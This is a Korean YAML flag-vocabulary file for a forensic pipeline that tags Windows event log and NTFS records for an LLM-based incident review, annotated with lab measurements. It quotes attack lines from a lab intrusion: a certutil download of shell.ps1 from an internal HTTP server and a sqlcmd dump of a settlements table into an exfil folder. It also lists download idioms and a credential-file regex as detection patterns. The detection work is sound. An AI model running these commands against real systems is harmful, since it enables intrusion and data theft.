# flags 어휘 정의 — 04단계 파싱이 룰 기반으로 부여한다.
#
# 이 어휘가 고정인 이유는 LLM에 전달할 레코드를 추리는 필터로 쓰이기
# 때문이다. 파서마다 다른 이름을 쓰면 record_filter.py가 레코드를
# 놓치고, 그 결과가 선별 재현율 저하로 잘못 집계된다.
#
# **이 파일이 어휘의 원본이다.** flagging.py 가 여기서 FLAGS 를 읽고,
# schemas/parsed_record.schema.json 의 enum 은 tools/sync_flag_enum.py 가
# 여기서 생성한다. 새 flag 는 이 파일에만 적고 생성기를 돌린 뒤 pytest 를
# 돌린다. 어긋나면 tests/test_mapping_loader.py 가 잡는다.
#
# ---------------------------------------------------------------- rule
#
# `when` 은 절(clause) 목록이고 **하나라도 맞으면** 붙는다. 절이 여럿인
# 것은 같은 뜻이 아티팩트마다 다르게 나타나기 때문이다 — deleted 를 보라.
#
#   artifact  대상. `evtx:*` 는 접두어 일치, `*` 하나면 전부.
#             카탈로그(_artifacts.yaml)에 있는 이름이어야 한다.
#   match     생략하면 "그 아티팩트의 모든 레코드". 나머지는 셋.
#               event_id       record["event_id"] 가 values 안에 있는가
#               list_contains  record[field] (리스트) 가 values 와 겹치는가
#               field_equals   record[field] 가 value 와 같은가 (최상위 키만)
#               field_regex    field(점 표기) 의 값이 values 의 정규식 중
#                              하나에 걸리는가. **어휘가 열려 있는 자리에만
#                              쓴다** — 토큰 목록으로 되는 것을 이걸로 쓰면
#                              이 파일만 읽어서 조건을 알기 어려워진다.
#                              대소문자는 패턴이 정한다((?i) 를 직접 적는다).
#                              로드할 때 컴파일해 보므로 오타는 그때 터진다.
#               field_in       field(점 표기) 의 값이 values 중 하나와 정확히
#                              같은가. 문자열로 맞춰 본다.
#                              **포함 검사로 대신하면 안 되는 자리에 쓴다** —
#                              포트 4444 를 field_contains 로 쓰면 14444 가
#                              걸린다(유효한 포트다).
#
# `handler` 는 선언으로 표현되지 않는 판정이다. flagging.py 의 HANDLERS 에
# 등록된 이름만 쓸 수 있다. `when` 과 함께 쓰면 **둘 다** 만족해야 한다 —
# when 이 대상을 좁히고 handler 가 판정한다.
#
# **선언으로 되는 것을 handler 로 넘기지 않는다.** 그러면 이 파일만 읽어서는
# 무슨 조건인지 알 수 없게 되고, 그게 원래 문제였다. handler 는 타임스탬프
# 비교처럼 근거가 코드 주석에 붙어 있어야 하는 것만 쓴다.
#
# `condition` 은 사람이 읽는 요약이다. 실행되는 것은 `rule` 이다.

flags:
  timestamp_mismatch:
    artifacts: [$MFT]
    condition: $SI와 $FN 생성 시각 불일치
    note: 타임스탬프 조작(T1070.006)의 대표 흔적. $FN은 사용자 도구로 바꾸기 어렵다.
    rule:
      when:
        - artifact: $MFT
      # 방향과 대상 선택에 실측 근거가 붙어 있다. flagging.py 의
      # MISMATCH_PAIRS 주석 참조 — 세 쌍을 다 보면 오탐 59%였다.
      handler: si_earlier_than_fn

  log_cleared:
    artifacts: [evtx:Security, evtx:System]
    condition: 감사 로그 삭제(Security 1102) · 이벤트 로그 삭제(System 104)
    note: |
      T1070.001 이 요구한다. **흔적 인멸 중에서도 성질이 다르다** — 파일
      삭제(T1070.004)나 타임스탬프 조작(T1070.006)은 지운 자리가 남지만,
      로그를 지우면 **지웠다는 사실 자체가 유일하게 남는 흔적**이다. 그
      한 건이 사라지면 그 구간에 무슨 일이 있었는지 말할 방법이 없다.

      채널 둘이 서로 다른 삭제를 남긴다. Security 1102 는 보안 감사 로그를
      지운 것이고, System 104 는 임의의 채널을 지운 것이다(어느 채널인지는
      이벤트 안에 있다). 둘 다 보는 이유는 공격자가 어느 쪽을 지울지 모르기
      때문이다.

      **실물로 확인한 것은 1102 뿐이다** (`snapshotA` 의 `Security.evtx`
      16,647건 중 1건, 2026-09-07). 104 는 같은 수집의 `System.evtx`
      1,683건에 0건이라 **명세를 옮긴 값이다** —
      `docs/limitations.md` 3-7.

      **이 플래그는 시간창 밖이어도 1순위다**(아래 `window_independent`).
      로그를 언제 지웠는지는 공격자가 고르는 것이라, 사고 시간창 안에서
      일어났으리라 가정할 근거가 없다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [1102]
        - artifact: evtx:System
          match: event_id
          values: [104]

  deleted:
    artifacts: [$MFT, $UsnJrnl]
    condition: MFT 레코드 미할당 상태 / USN 사유에 file_delete
    note: |
      두 아티팩트가 같은 이름을 쓰는 이유는 뜻이 같기 때문이다. $MFT는
      "지금 지워져 있다"는 상태고 $UsnJrnl은 "지워졌다"는 사건이다.
      Tier 2 유예 조건이 이 플래그를 보므로 이름이 갈라지면 안 된다.
    rule:
      when:
        - artifact: $MFT
          match: field_equals
          field: allocated
          value: false
        - artifact: $UsnJrnl
          match: list_contains
          field: reason
          values: [file_delete]

  zero_timestamp:
    artifacts: [$MFT]
    condition: 타임스탬프가 0 또는 비정상 값
    note: |
      $UsnJrnl에는 붙이지 않는다. USN 파서는 시각을 읽지 못하면 timestamp
      키 자체를 빼므로 "0이 들어 있다"를 판정할 대상이 없다.
    rule:
      when:
        - artifact: $MFT
      handler: has_zero_timestamp

  file_created:
    artifacts: [$UsnJrnl, evtx:Sysmon]
    condition: USN 사유에 file_create, 또는 Sysmon 11(FileCreate)
    note: |
      웹셸 설치(T1505.003)처럼 "없던 파일이 생겼다"가 핵심인 기법에서
      $MFT보다 강한 증거다. $MFT는 생성 시각만 남고 조작될 수 있는데,
      저널은 사건 자체를 순서대로 적는다.

      범위를 좁히지 않으면 많이 걸린다 — 바쁜 볼륨에서는 파일 생성이
      수만 건이다. 03단계가 extensions 로 좁혀 주는 것을 전제한다.
    rule:
      when:
        - artifact: $UsnJrnl
          match: list_contains
          field: reason
          values: [file_create]
        # Sysmon 11(FileCreate)도 같은 사실이다. 새 이름을 만들지 않는
        # 이유는 05단계가 어휘로 레코드를 고르기 때문이다 — 이름이
        # 갈라지면 같은 사실을 두 번 찾아야 한다.
        - artifact: evtx:Sysmon
          match: event_id
          values: [11]

  # ── 아래 여섯은 예전에 `evtx:*` 로 걸려 있었다 (2026-08-25 에 좁혔다) ──
  #
  # EventID 는 **제공자 안에서만** 유일하다. 채널은 그 근사치다 — 실측하면
  # System.evtx 하나에 제공자가 22개다(Win7 7601). 그래도 채널로 좁히면
  # 실질적으로 해결된다. 같은 채널 안에서 두 제공자가 같은 ID 를 쓰는 경우는
  # 실측 0건이었고, 진짜 위험은 **채널 사이**이기 때문이다.
  #
  # `evtx:*` 로 두면 채널이 늘어날 때마다 사정거리가 조용히 넓어진다. 채널이
  # 5개에서 14개가 된 날(K-001 대응) 그 재확인을 빠뜨렸고, AssignedAccess
  # 세 채널이 event_id 필터 없이 전량 파싱되는 탓에 그 채널의 ID 를 모르는
  # 채로 이 룰들에 노출돼 있었다.
  #
  # 각 룰의 `artifacts:` 는 처음부터 정확한 채널을 적고 있었다. 룰이 그
  # 선언을 안 지키고 있었을 뿐이다. tests/test_flag_rules.py 가 이제
  # `match: event_id` 절에 와일드카드를 못 쓰게 막는다.

  account_created:
    artifacts: [evtx:Security]
    condition: EVTX 4720
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4720]

  privileged_group_add:
    artifacts: [evtx:Security]
    condition: EVTX 4728/4732, 대상이 특권 그룹
    note: |
      4728/4732에서 TargetUserName은 **그룹 이름**이다. 계정 이름이 아니다.
      이걸 헷갈리면 특권 그룹 추가를 전부 놓친다. 그 판정이 handler 에
      남아 있는 이유다 — 아래 privileged_groups 목록과 대조해야 한다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4728, 4732]
      handler: target_is_privileged_group

  logon_success:
    artifacts: [evtx:Security]
    condition: EVTX 4624/4672
    note: |
      4672(특권 부여)는 관리자 세션이 열릴 때 4624 직후에 따라붙는
      동반 이벤트라 같은 이름으로 묶는다. 나누면 한 로그온이 두 어휘로
      갈라져 05단계에서 짝이 끊긴다.

      로그온은 정상 시스템에서도 많이 남는다. 이 flag 가 필터로 일하는
      것은 03단계가 event_ids 와 time_range 로 이미 좁혀 준 덕이다.
      범위 없이 evtx 전체에 붙이면 쿼터를 이것만으로 채운다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4624, 4672]

  logon_failed:
    artifacts: [evtx:Security]
    condition: EVTX 4625
    note: 성공과 나누는 이유는 뜻이 다르기 때문이다. 실패의 연속은 자격증명 추측을, 실패 뒤의 성공은 그 성공을 뜻한다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4625]

  service_config_changed:
    artifacts: [evtx:System]
    condition: EVTX 7040 서비스 시작 유형 변경
    note: |
      보안 서비스를 죽이는 흔한 방법이 삭제가 아니라 Start 값을
      4(disabled)로 바꾸는 것이다. 레지스트리에는 바뀐 결과만 남고
      바뀐 시점은 이 이벤트에만 남는다 — 그래서 7045(설치)와 따로 둔다.
    rule:
      when:
        - artifact: evtx:System
          match: event_id
          values: [7040]

  service_installed:
    artifacts: [evtx:System]
    condition: EVTX 7045
    note: T1543.003(서비스 지속성)의 대표 흔적. 설치 순간에만 남고 로그가 롤오버되면 사라진다.
    rule:
      when:
        - artifact: evtx:System
          match: event_id
          values: [7045]

  share_accessed:
    artifacts: [evtx:Security]
    condition: 네트워크 공유 접근(5140) 및 공유 안 개체 접근(5145)
    note: |
      T1021.002 가 요구한다. `net use \\HOST\C$` 의 **착지 측** 흔적이라
      로그온(4624 Type 3)과 짝을 이룬다 — 저쪽은 "누가 인증했는가"이고
      이쪽은 "무엇에 손댔는가"다. 둘을 나눠 두어야 인증만 하고 만 것과
      실제로 파일에 접근한 것이 구별된다.

      5145 는 개체 단위라 한 세션에서 수백 건이 나올 수 있다. 5140 과 같은
      flag 로 묶은 것은 05단계가 둘을 같은 사건의 앞뒤로 읽어야 하기
      때문이고, 양이 문제가 되면 5145 를 떼어 좁힌다.

      **실물로 확인하지 못했습니다.** 이 두 ID 가 남으려면 감사 정책에서
      "개체 액세스 감사"가 켜져 있어야 하는데, 손에 있는 이미지에는 그
      기록이 없습니다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [5140, 5145]

  defender_disabled:
    artifacts: [evtx:Defender]
    condition: 실시간 보호 비활성(5001)·보호 비활성화 알림(5004)·구성 변경(5007)·위협 감지(1116)
    note: |
      T1562.001 이 요구한다. `registry:SOFTWARE` 의 정책 값 변경과 짝이다 —
      저쪽은 "무엇을 껐는가"가 레지스트리에 남은 것이고, 이쪽은 **당사자인
      Defender 가 자기 로그에 남긴 것**이다. 레지스트리만 보면 정책이
      적용됐는지 알 수 없고, 이 채널만 보면 무엇을 어떻게 껐는지 모른다.

      **실물로 확인하지 못했습니다.** 손에 있는 이미지에 이 채널이 없어
      event_id 는 카탈로그 설명의 값을 그대로 옮겼습니다. 이 셋이 실제로
      맞는지는 Defender 가 켜진 스냅샷이 있어야 잽니다.
    rule:
      when:
        - artifact: evtx:Defender
          match: event_id
          values: [1116, 5001, 5004, 5007]

  powershell_logged:
    artifacts: [evtx:PowerShell]
    condition: 스크립트블록 로깅(4104)·모듈 로깅(4103)
    note: |
      T1059.001 이 요구한다. Sysmon 1 의 `shell_spawned` 와 다른 것을 본다 —
      저쪽은 "powershell.exe 가 떴다"까지이고, 이쪽은 **무엇을 실행했는지**
      본문이 남는다. 난독화된 한 줄짜리가 여기서만 풀린다.

      **둘 다 기본으로 꺼져 있습니다.** 스크립트블록 로깅은 그룹 정책으로
      켜야 남고, 안 켜진 장비에서는 이 채널이 비어 있습니다. 없다고 해서
      PowerShell 이 안 돌았다는 뜻이 아닙니다 — 보고서가 그렇게 읽히지
      않도록 주의해야 하는 자리입니다.

      **실물로 확인하지 못했습니다.** 손에 있는 이미지에 이 채널이 없습니다.
    rule:
      when:
        - artifact: evtx:PowerShell
          match: event_id
          values: [4103, 4104]

  # ----------------------------------------------------------- 네트워크
  #
  # 아래 셋은 `evtx:*` 가 아니라 **정확한 아티팩트 이름**으로 건다.
  # EventID 는 제공자 안에서만 유일하기 때문이다(docs/limitations.md
  # "EventID만으로 이벤트를 특정하지 않습니다"). 실제로 겹친다 —
  # NetworkProfile 의 10000(네트워크 연결)은 T1200 매핑이 evtx:System 에
  # 요청하는 Kernel-PnP 10000 과 번호가 같다. `evtx:*` 로 걸면 장치 구성
  # 이벤트에 network_state_changed 가 붙는다.

  firewall_config_changed:
    artifacts: [evtx:Firewall]
    condition: 방화벽 규칙 추가·변경·삭제(2004/2005/2006/2033) 또는 프로필 설정 변경(2003)
    note: |
      규칙 추가와 프로필 끄기를 한 어휘로 묶는다. 조사에서 묻는 것이
      "방화벽 구성이 사건 시각에 손댔는가" 하나이고, 어느 쪽이었는지는
      fields 의 RuleName·Direction·Action 을 보면 나온다.

      2033(모든 규칙 삭제)은 드물지만 강한 신호라 같이 넣는다.
    rule:
      when:
        - artifact: evtx:Firewall
          match: event_id
          values: [2003, 2004, 2005, 2006, 2033]

  bits_transfer:
    artifacts: [evtx:BITS]
    condition: BITS 전송 작업 생성·시작·중지·오류 (3/59/60/61)
    note: |
      BITS 는 Windows Update 가 늘 쓰는 정상 기능이라 그 자체로는
      의심 신호가 아니다. 값이 있는 것은 **59/60 이 URL 을 들고 있다**는
      점이다 — 어디로 갔는지가 fields 에 남는 몇 안 되는 자리다.

      3(작업 생성)은 소유자와 생성 프로세스를 담는다. 정상 트래픽과
      가르는 것은 이 flag 가 아니라 그 필드를 읽는 05단계의 몫이다.
    rule:
      when:
        - artifact: evtx:BITS
          match: event_id
          values: [3, 4, 59, 60, 61]

  network_state_changed:
    artifacts: [evtx:NetworkProfile]
    condition: 네트워크 연결(10000)·해제(10001)
    note: |
      단독으로는 약한 신호다. 쓰임은 다른 흔적의 시각을 가르는 데 있다 —
      "그때 네트워크에 붙어 있었는가"가 외부 전송 가능성의 전제다.
    rule:
      when:
        - artifact: evtx:NetworkProfile
          match: event_id
          values: [10000, 10001]

  # ── K-001 키오스크 시나리오 (2026-08-25) ───────────────────────────
  #
  # 아래 일곱은 새로 연 채널들의 게이트 4를 닫는다. 채널만 등록하고 여기를
  # 빠뜨리면 03단계가 "봤다"고 적고 04단계가 파싱까지 한 뒤 **모델에만 한
  # 건도 안 간다** — 보고서에는 그냥 소견이 없는 걸로 보인다.

  process_lifecycle_closed:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 5 process termination; closes a matching Event 1 lifecycle
    note: |
      This is correlation context, not a suspiciousness verdict.  Event 5 is
      retained so the LLM can distinguish a short-lived launcher from the
      duration of its descendants.
    rule:
      when:
        - artifact: evtx:Sysmon
          match: event_id
          values: [5]

  shell_spawned:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1(프로세스 생성) 중 셸·시스템 유틸리티가 실행된 것
    note: |
      K-001 Stage 3의 결정적 신호다. 주문 UI만 떠 있어야 하는 키오스크에서
      셸이 뜨는 것 자체가 제한 환경 이탈이고, 부모가 무엇이냐가 그 다음
      질문이다(fields.ParentImage 는 레코드에 그대로 실려 모델이 본다).

      **EID 1 전체에 붙이지 않는다.** 프로세스 생성은 이 장비에서 가장 흔한
      이벤트라 전량에 붙이면 필터가 일을 안 한다. 목록은 "정상 키오스크
      운영에서 뜰 이유가 없는 것"만 담는다.

      **이름으로 거는 유일한 룰이고, 그래서 반쪽이다.** 공격자가 무엇을
      실행할지는 모르기 때문이다. 나머지 반쪽은 이름이 아니라 맥락으로 거는
      execution_from_unusual_path(어디에 있나)와 unexpected_parent_process
      (누가 실행시켰나)가 맡는다. 셋이 겹치지 않는 사실을 본다 —
      Stage 3(셸 획득)은 이 룰이, Stage 2(비승인 실행파일)는 나머지 둘이
      잡는다.

      앞의 역슬래시는 경로 구분자다. 빼면 evilcmd.exe 가 함께 걸린다.

      목록은 공개 DFIR 자료와 Stage 3 서술(cmd/explorer/taskmgr)에서 골랐고
      **실제 키오스크 이미지로 대조한 적이 없다** — docs/limitations.md.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_endswith
          field: fields.Image
          values:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\explorer.exe'
            - '\taskmgr.exe'
            - '\mmc.exe'
            - '\regedit.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\rundll32.exe'
            - '\control.exe'

  lolbin_download:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 명령행이 정상 도구로 원격 파일을 받아 오는 관용구를 담은 것
    note: |
      **K-KIOSK-USB-0908 에서 놓친 자리다**(2026-09-08). 실제 침해의 첫 행위가
      `certutil -urlcache -split -f http://192.168.0.153:8000/shell.ps1` 이었는데
      flags 가 비어, 프롬프트에 "볼 이유"가 없는 레코드로 실렸고 05단계가
      고르지 않았다. 레코드는 모델에게 갔다 — 못 간 것이 아니라 **아무 표시
      없이 갔다.**

      **도구 이름이 아니라 관용구로 건다.** certutil 은 인증서 작업에도 쓰이지만
      `-urlcache` 는 받아 오는 용도뿐이다. 이름만으로 걸면 정상 사용까지 전량이
      걸려 필터가 일을 안 한다.

      네트워크 연결 자체(Sysmon 3)로 잡는 것이 정석이지만 이 증거의 Sysmon 은
      EID 1·5 만 남긴다. 설정이 네트워크를 안 찍으면 명령행이 유일한 자리다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_contains
          field: fields.CommandLine
          values:
            - '-urlcache'
            - 'bitsadmin /transfer'
            - 'invoke-webrequest'
            - 'downloadstring'
            - 'downloadfile'
            - 'start-bitstransfer'

  uac_bypass_candidate:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 UAC 우회에 흔히 쓰이는 자동 승격 실행 파일이 뜬 것
    note: |
      **이름으로 거는 룰이라 반쪽이다** — shell_spawned 와 같은 한계다. 목록은
      auto-elevate 속성 때문에 공개 자료가 반복해 지목하는 것들이고, 정상 실행도
      있으므로 **이것만으로 침해가 아니다.** 부모가 무엇이냐를 모델이 함께 본다.

      K-KIOSK-USB-0908 에서 fodhelper.exe 가 셸 획득 직후 떴는데 flags 가 비어
      있었다(2026-09-08). **slui.exe 는 뺐다** — 같은 증거에서 라이선스 UI 로
      71건이 떠, 목록에 두면 이 flag 가 뜻을 잃는다(fodhelper 는 1건).
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_endswith
          field: fields.Image
          values:
            - '\fodhelper.exe'
            - '\computerdefaults.exe'
            - '\sdclt.exe'

  database_logon:
    artifacts: [evtx:Application]
    condition: Application 채널의 데이터베이스 로그인 성공(18453·18454)·실패(18456)와 감사(33205)
    note: |
      **이 사건의 목적에 가장 가까운 자리다.** 시나리오의 Stage 8~10 은
      DB 에 붙어 결제 정산 테이블을 읽는 것인데, 그 행위는 윈도우 로그온이
      아니라 **애플리케이션 자신의 로그**에 남는다. `logon_success` 가 보는
      Security 4624 에는 없다.

      실측(K2L6 세 노드, 2026-09-10):

        MGMT   전체 6,269건 중 이 EID 426건
               18454 로그인 성공 243 / 17137 시작 106 / 18453 성공 73 /
               18456 실패 3 / 33205 감사 1
        KIOSK  0건
        POS    0건

      **SQL Server 가 없는 기계에서는 0건이다.** 이 축을 바탕에 두어도 그런
      기계의 비용은 늘지 않는다 — `_baseline.yaml` 에 넣은 근거가 그것이다.

      `mgmt_app` 계정의 로그인이 **공격 시간대(09-08 07:00 이후)에 34건**
      있다. 그 계정은 시나리오에서 공격자가 설정 파일에서 훔친 DB 계정이다.

      **17137(데이터베이스 시작)은 뺐다.** 106건으로 이 목록에서 가장 많은데
      서비스가 뜰 때마다 나는 것이라 침해와 무관하다.

      **33205(SQL Server Audit)는 1건뿐이다.** 시나리오는 이 감사가 SELECT
      질의를 담는다고 적었지만, 이 수집본의 유일한 33205 는 2026-09-03 의
      `action_id:AUSC`(감사를 켠 기록)이고 `settlements`·`SELECT` 문자열은
      **0건**이다. 넣어 두는 것은 감사가 제대로 도는 수집본을 위한 것이고,
      **이 증거에서 Stage 9·10 을 되살리지는 못한다**는 사실을 적어 둔다.
    rule:
      when:
        - artifact: evtx:Application
          match: event_id
          values: [18453, 18454, 18456, 33205]

  system_crash_recorded:
    artifacts: [evtx:System]
    condition: System 채널의 BugCheck(1001)·예기치 않은 종료(6008)·정상 종료/재부팅(1074)
    note: |
      **커널 익스플로잇이 실패하면 파랗게 죽는다.** T1210(원격 서비스
      익스플로잇) 및 T1529(시스템 종료/재부팅)가 이 채널을 요청하는데 받는 flag 다.
      요청은 하는데 표시가 없으면 그 레코드는 04까지 와서 "볼 이유 없이"
      05에 실린다.

      `app_crash` 와 다르다. 저쪽은 `evtx:Application` 의 1000·1001·1002 로
      **응용 프로그램**이 죽은 것이고, 이쪽은 `evtx:System` 이라 **커널**이
      죽거나 재기동된 것이다. EID 번호가 겹치는 것은 우연이다.

      K-001 Stage 3 의 SMBGhost 는 익스플로잇 뒤 POS 가 블루스크린으로
      죽거나 재부팅될 수 있다.

      **악성 판정이 아니다.** 정상 하드웨어 문제나 정기 재부팅으로도 난다.
    rule:
      when:
        - artifact: evtx:System
          match: event_id
          values: [1001, 1074, 6008]

  remote_interactive_logon:
    artifacts: [evtx:Security]
    condition: Security 4624 중 LogonType 이 10(원격 대화형)인 것
    note: |
      **`logon_success` 로는 안 보인다.** 그 flag 는 4624 전부에 붙어서, 이
      증거의 관리서버에서 2,945건이다. 원격 데스크톱으로 들어온 것은 그중
      **6건**이고, 나머지는 서비스 로그온(Type 5)이 1,292건, 대화형(Type 2)이
      151건이다. 같은 flag 를 달고 있으면 보장 레인에 못 올린다 — 올리면
      홍수가 된다.

      실측(`K2L3-MGMT`, 2026-09-10). LogonType 분포와 Type 10 전량:

        5: 1,292  2: 151  3: 25  7: 22  0: 10  **10: 6**

        EVTX-SEC#20198  2026-08-27T10:45:39  100.83.93.111  MGMT
        EVTX-SEC#20229  2026-08-27T10:46:10  100.83.93.111  MGMT
        EVTX-SEC#20325  2026-08-27T10:51:11  100.83.93.111  mgmt_admin1
        (각 2건씩 짝을 이룬다)

      여섯 건 전부 **같은 외부 주소**에서 왔고 계정이 둘이다. 이것이 시나리오의
      "POS 에서 훔친 계정으로 관리서버 RDP 진입"에 해당하는 자리다.

      **`field_in` 을 쓰는 이유가 여기 있다.** `field_contains` 로 '10' 을
      쓰면 LogonType 범위(0~13)에서는 우연히 안전하지만, 그 안전이 값의
      범위에 기대는 것이라 규칙으로 삼을 수 없다.

      **악성 판정이 아니다.** 정상 원격 관리도 Type 10 이다. 이 flag 는 "원격
      대화형 로그온이 있었다"까지만 말하고, 뜻은 05단계가 정한다.
    rule:
      when:
        - artifact: evtx:Security
          event_ids: [4624]
          match: field_in
          field: fields.LogonType
          values: ['10', 10]

  credential_config_accessed:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 명령행이 자격증명이 평문으로 든 설정 파일을 여는 것
    note: |
      **K2L3 에서 통째로 놓친 자리다**(2026-09-10). 시나리오의 자격증명 척추
      (POS 에서 관리서버 열쇠를, 관리서버에서 DB 열쇠를 얻는 두 단계)가
      보고서에 한 줄도 없었는데, 레코드는 **완벽하게 있었다**:

        SYSMON#42071  2026-09-08T07:25:33  flags=[]
          "C:\Windows\system32\NOTEPAD.EXE"
          C:\projects\kiosk-dfir\management-server-app\server\config\settings.json

        SYSMON#42078  2026-09-08T07:26:18  (45초 뒤) SSMS.exe 실행

      메모장으로 설정 파일을 열고 45초 뒤 DB 관리 도구를 띄운 것이라, 두
      레코드가 나란히 있으면 뜻이 분명하다. 그런데 앞의 것에 flag 가 없어
      배분에서 밀렸다.

      **이 축에는 관용구가 없다.** 설정 파일을 여는 것은 `type`·`notepad`·
      `more` 무엇으로도 되고, 공통은 **무엇을 여느냐**뿐이다.

      **그렇다고 파일 이름을 열거하지 않는다.** 처음에는 `settings.json`·
      `mgmt-credentials`·`credentials.ini` 를 적었는데, 그것은 **이 랩의 파일
      이름**이라 다음 사건에서 안 맞는다. `_attention_signals.yaml` 이 실행
      파일 이름을 경계하는 것과 같은 종류의 과적합이다 — 저쪽은 공격자가
      고르는 이름이고 이쪽은 방어자가 만든 이름이라는 차이는 있지만, 한
      표본에서만 맞는 값이 남는다는 결과는 똑같다.

      대신 **자격증명이 흔히 들어가는 파일의 꼴**로 건다. 어휘가 열려 있는
      자리라 토큰 목록이 아니라 정규식이다(`field_regex` 의 설명).

      **파일 이름 토큰 안에서만 맞춘다.** 앞을 `(?<![^\/:"\s])` 로 끊고
      `[^\/:"\s]*` 로 구분자·공백·따옴표를 넘지 않게 했다. 안 그러면 `.*` 가
      명령행을 가로질러 **앞쪽의 `config` 와 뒤쪽의 `.json` 이 서로 다른
      토큰이어도** 걸린다. 실측에서 그 차이가 36건 대 16건이었다.

      낱말이 앞에 오든 뒤에 오든 걸리도록 **앞을 내다보는 조건**으로 썼다.
      그래서 `settings.json`·`appsettings.Production.json`·
      `mgmt-credentials.ini`·`app.config`·`.env`·`database.yml` 이 한 패턴에
      다 들어온다. 그중 이 랩에 실제로 있는 것은 첫 번째뿐이다.

      적중 실측(세 노드, Sysmon EID 1 명령행 15,605건): **16건(0.10%)**.
      그중 공격은 1건(`SYSMON#42071`)이고, 나머지는 랩 제작자가 2026-09-03 에
      환경을 만들며 남긴 `git add`·`notepad` 와 SQL Server 설치 관리자의
      `/ConfigurationFile=...SqlServerInstallConfig.ini` 다.

      **오탐이 15건(94%)이지만 좁히지 않는다.** 공격자와 제작자가 **같은
      파일**을 열었기 때문이다 — 레코드만 보고는 구별되지 않는다. 가르는
      것은 시각이고, 그것은 05단계의 앵커 거리 정렬이 할 일이다
      (`attention.burst_anchor`). 신고에 사고 시각이 있으면 03단계의
      time_range 가 그보다 앞에서 걸러 낸다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_regex
          field: fields.CommandLine
          values:
            - '(?i)(?<![^\\/:"\s])(?=[^\\/:"\s]*(?:settings|config|credential|secret|passw|database|conn_str|token|apikey|env))[^\\/:"\s]*\.(?:json|ini|env|xml|conf|config|ya?ml)(?![^\s",;)])'

  uncommon_destination_port:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 3 중 목적지 포트가 알려진 서비스 포트도 임시 포트도 아닌 것
    note: |
      **리버스 셸의 착지점이다.** 시나리오는 공격자가 netcat 을 열어 두고
      키오스크·POS 양쪽에서 셸을 받는다. 두 노드 모두 레코드가 있었고
      `network_connection` 만 붙어 있었다 — 그 flag 는 EID 3 전량(노드당
      75~529건)에 붙으므로 신호가 되지 못한다.

      **전신은 `목적지 포트 == 4444` 였다**(2026-09-10). 그 룰의 note 가 스스로
      한계를 적고 있었다 — *"4444 는 도구 기본값의 관용이지 공격의 정의가
      아니다. 공격자가 포트를 바꾸면 조용히 0건이 된다."* 이 랩의 실측 3건을
      근거로 숫자 하나를 박은 것이라 **명백한 과적합이었고**, 2026-09-11 에
      축을 뒤집었다.

      **공격 포트가 아니라 정상 포트를 열거한다.** 그러면 공격자가 숫자를
      바꾸는 행위 자체가 목록 밖으로 나가는 행위가 된다. 판정은
      `flagging.py` 의 `uncommon_destination_port` handler 이고, 무엇이 정상
      서비스인가는 아래 `service_ports` 다.

      실측(`Test1` 세 노드, 2026-09-11) — Sysmon EID 3 전량 966건 중:

        KIOSK  529건 -> 10건   4444 x3 · 8000 x2 · 5000/5001 x3 · 5357 x2
        POS     75건 ->  6건   4444 x1 (spoolsv.exe) · 5002 x5
        MGMT   362건 ->  1건   없음 (52268 은 임시 포트라 빠진다)

      **전신이 놓치던 것을 잡는다.** 4444 룰은 같은 데이터에서 4건이었고,
      이 룰은 그 4건을 포함하면서 공격자 HTTP 서버(`:8000`, Stage 1 의
      certutil 다운로드 착지점)와 nmap 의 스캔 포트를 함께 잡는다.

      **POS 쪽이 특히 이 flag 로만 보인다.** SMBGhost 는 사전 인증 RCE 라
      로그온 이벤트가 남지 않아 착지 자체를 말해 주는 것이 이 아웃바운드뿐이다.
      부모가 `spoolsv.exe` 인 것도 그 자리와 맞다.

      **오탐이 남는다.** 5000~5002 는 이 환경 앱의 API 포트라 8건이 걸린다.
      그것이 정상임을 아는 것은 사이트 지식이므로 `service_ports` 에 적으면
      빠진다 — 코드가 아니라 어휘의 자리다. **여기 적지 않은 것은 의도다**:
      이 저장소의 데이터셋이 하나뿐이라, 지금 적으면 그 역시 이 랩에만 맞는
      값이 된다.

      **악성 판정이 아니다.** "흔히 보는 서비스 포트가 아니다"만 말한다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [3]
      handler: uncommon_destination_port

  database_table_dumped:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 명령행이 테이블을 통째로 읽어 파일로 빼는 관용구를 담은 것
    note: |
      **K2L-20260908 에서 놓친 자리다**(2026-09-10). 이 사건의 목적이
      결제 정산 데이터였는데, 그것을 가져가는 행위에 flag 가 하나도
      없었다. 레코드는 04단계에 있었고 05단계에도 갔지만 **표시가 없어**
      배분에서 밀렸고, 관리서버 보고서는 수집 도구(kape.exe)와 VMware
      스크립트만 실었다.

        SYSMON#42150  2026-09-08T07:46:25  flags=[]
          SQLCMD.EXE -S localhost -U mgmt_app -P *** -Q
          "SET NOCOUNT ON; SELECT * FROM management.dbo.settlements"
          -o C:\exfil\settlements_20260908_1646.csv -s , -W

      **도구 이름이 아니라 관용구로 건다**(`lolbin_download` 와 같은 판단).
      sqlcmd 는 정상 운영에 쓰이고, 실제로 이 증거에도 74건이 있다 —
      데이터베이스를 만들고 로그인을 고치는 관리 작업이다. 이름으로 걸면
      그 74건이 전량 걸려 필터가 일을 안 한다.

      `select * from` 은 **테이블 하나를 통째로 가져오는 것**이다. 조건절이
      없다는 뜻이라, 사람이 무엇을 찾는 질의와 구별된다. 실제로 이
      증거에서 관리 작업 쪽은 `SELECT name FROM sys.databases` 처럼 전부
      열을 특정한다.

